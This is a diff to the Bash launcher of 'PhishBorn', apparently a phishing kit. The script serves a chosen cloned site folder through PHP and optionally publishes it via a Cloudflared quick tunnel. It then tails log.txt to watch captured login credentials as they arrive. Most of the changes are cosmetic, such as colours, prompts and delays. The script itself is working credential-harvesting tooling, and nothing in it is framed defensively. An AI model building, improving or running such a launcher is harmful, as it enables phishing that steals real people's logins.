@@ -4,16 +4,14 @@ cd "$(dirname "$0")"
 site_dir="site"
 
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[1;34m'
-YELLOW='\033[1;33m'
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 NC='\033[0m' # 色をリセット
 
 # ヘッダー
 echo -e "${BLUE}"
-echo -e "         PhishBorn${NC} by ${YELLOW}tajitag"
-echo "====================================================================="
+sleep 1
+echo -e "         PhishBorn${NC} by tajitag"
 echo ""
 
 
@@ -29,12 +27,12 @@ if [ ${#folders[@]} -eq 0 ]; then
   exit 1
 fi
 
-
-echo -e "${GREEN}起動するサイトを選んでください：${NC}"
+sleep 1
+echo -e "${ORANGE}[${NC}-${ORANGE}]${NC} ${GREEN}起動するサイトを選んでください：${NC}"
 for i in "${!folders[@]}"; do
-  echo -e "${YELLOW}[$((i+1))]${NC} ${folders[$i]}"
+  echo -e "${ORANGE}[${NC}${YELLOW}$((i+1))${NC}${ORANGE}]${NC} ${folders[$i]}"
 done
-echo -e "${YELLOW}[0]${NC} 終了"
+echo -e "${ORANGE}[${NC}${YELLOW}0${NC}${ORANGE}]${NC} 終了"
 echo ""
 
 
@@ -49,20 +47,24 @@ elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
   echo -e "${BLUE}${selected} を選択しました${NC}"
   cd "$site_dir/$selected"
 
+clear
+
   echo ""
-  echo -e "${GREEN}公開方法を選んでください：${NC}"
-  echo -e "${YELLOW}[1]${NC} ローカルホスト（http://localhost:8000）"
-  echo -e "${YELLOW}[2]${NC} 仮想サーバー公開（Cloudflared使用）"
+  echo -e "${ORANGE}[${NC}-${ORANGE}]${NC} 公開方法を選んでください："
+  echo -e "${ORANGE}[${NC}1${ORANGE}]${NC} ローカルホスト（http://localhost:8000）"
+  echo -e "${ORANGE}[${NC}2${ORANGE}]${NC} Cloudflared使用"
+
   echo ""
   read -p "番号を入力 >>> " method
 
   > log.txt
  clear
   if [[ "$method" == "1" ]]; then
-    echo -e "${BLUE}ローカルホストで起動します${NC}"
+    echo -e "ローカルホストで起動します"
     php -S localhost:8000 > /dev/null 2>&1 &
     server_pid=$!
-    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC} (http://localhost:8000/index.php)"
+    sleep 1
+    echo -e "ログイン情報を監視中（Ctrl+Cで終了）:(http://localhost:8000/index.php)"
     tail -f log.txt
     kill $server_pid
 
@@ -71,7 +73,7 @@ elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
       echo -e "${RED}Cloudflared が見つかりません。インストールしてください。${NC}"
       exit 1
     fi
-    echo -e "${BLUE}Cloudflaredで仮想サーバーを起動します${NC}"
+    echo -e "Cloudflaredで仮想サーバーを起動します"
     php -S localhost:8000 > /dev/null 2>&1 &
     server_pid=$!
     sleep 2
@@ -80,8 +82,8 @@ elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
     sleep 4
     clear
     public_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cloudflared.log | head -n 1)
-    echo -e "${GREEN}公開URL：${YELLOW}$public_url${NC}"
-    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC}"
+    echo -e "公開URL：$public_url"
+    echo -e "ログイン情報を監視中（Ctrl+Cで終了）:"
     tail -f log.txt
     kill $server_pid
     kill $tunnel_pid
